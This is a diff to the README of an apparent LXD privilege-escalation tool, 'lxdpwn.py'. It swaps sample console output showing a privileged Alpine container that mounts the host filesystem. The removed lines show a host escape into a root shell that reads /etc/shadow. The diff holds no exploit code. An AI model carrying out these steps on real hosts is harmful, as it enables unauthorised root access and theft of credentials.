@@ -133,27 +133,31 @@ sudo python3 lxdpwn.py --skip-install
 |_____/_/\_\____/|_|     \_/\_/  |_| \_|
                   @jacstory
 
-[2024-01-01 10:00:01] [✓] Root privileges confirmed
-[2024-01-01 10:00:01] [→] Target: ubuntu-20.04 (kernel 5.4.0)
-[2024-01-01 10:00:01] [→] User: jac (in lxd group)
+═══ LXD INSTALLATION ═══
 
-[2024-01-01 10:00:02] [✓] LXD environment ready
-[2024-01-01 10:00:03] [→] Deploying Alpine container...
-[2024-01-01 10:00:05] [✓] Container 'alpine-container' created
+⚙  BEGIN        │ Starting LXD installation...
 
-[2024-01-01 10:00:06] [→] Mounting host filesystem...
-[2024-01-01 10:00:07] [✓] Host root mounted at /mnt/root
+ℹ  SKIP         │ LXD already installed, skipping installation
 
-[2024-01-01 10:00:08] [🔥] Attempting host escape...
-[2024-01-01 10:00:09] [✓] SUCCESS! Entering host system...
+═══ CONTAINER SETUP ═══
 
-root@host:/# whoami
-root
-root@host:/# cat /etc/shadow
-...
+📦 START        │ Setting up container...
+
+⚙  LXD          │ Ensuring LXD is initialized...
+✓  OK           │ LXD is ready
+↓  IMAGE        │ Checking Alpine image...
+✓  EXISTS       │ Image already loaded
+🧹 CLEANUP      │ Stopping and removing containers...
+✓  DONE         │ Cleanup completed successfully
+↓  IMPORT       │ Importing Alpine image...
+✓  IMPORT       │ Image imported (fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b)
+📦 LAUNCH       │ Launching privileged container...
+✓  START        │ Container is running
+    └─ Container: alpine-container
+⚙  MOUNT        │ Mounting host filesystem...
+✓  MOUNT        │ Host filesystem mounted at /mnt/root
+
 ```
-
----
 ### Technical Breakdown
 
 #### 1. **Privilege Check**
@@ -207,26 +211,31 @@ Run the offline server script to download all required files and host them local
                  @jacstory
 
 
-📁  INFO ...... |   Working directory: /home/jacstory/lxd-offline
-⏸️  Status ...... |  Checking files...
+═══ LXD INSTALLATION ═══
 
-    ✔️   available    ...... |   alpine-v3.13-x86_64-20210218_0139.tar.gz (3.1 MB)
-    ✔️   available    ...... |   core_17272.assert (4.4 KB)
-    ✔️   available    ...... |   core_17272.snap (105.0 MB)
-    ✔️   available    ...... |   lxd_37395.assert (4.8 KB)
-    ✔️   available    ...... |   lxd_37395.snap (118.4 MB)
-    ✔️   available    ...... |   snapd_2.71-3+b1_amd64.deb (18.2 MB)
+⚙  BEGIN        │ Starting LXD installation...
 
-⏸️  Status ...... |  Total: 6 files (244.7 MB)
+ℹ  SKIP         │ LXD already installed, skipping installation
 
-🔌  INFO ...... |  Enter port number [default: 8000]: 9000
+═══ CONTAINER SETUP ═══
 
-🚀  INFO ...... |   Starting HTTP server on port 9000...
-📁  INFO ...... |   Serving files from: /home/jacstory/lxd-offline
+📦 START        │ Setting up container...
 
-⏸️  Press Ctrl+C to stop the server
+⚙  LXD          │ Ensuring LXD is initialized...
+✓  OK           │ LXD is ready
+↓  IMAGE        │ Checking Alpine image...
+✓  EXISTS       │ Image already loaded
+🧹 CLEANUP      │ Stopping and removing containers...
+✓  DONE         │ Cleanup completed successfully
+↓  IMPORT       │ Importing Alpine image...
+✓  IMPORT       │ Image imported (fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b)
+📦 LAUNCH       │ Launching privileged container...
+✓  START        │ Container is running
+    └─ Container: alpine-container
+⚙  MOUNT        │ Mounting host filesystem...
+✓  MOUNT        │ Host filesystem mounted at /mnt/root
+root@alpine-container:/# 
 
-⏸️  Status ...... |  Server Start 0.0.0.0:9000
 
 ```
 
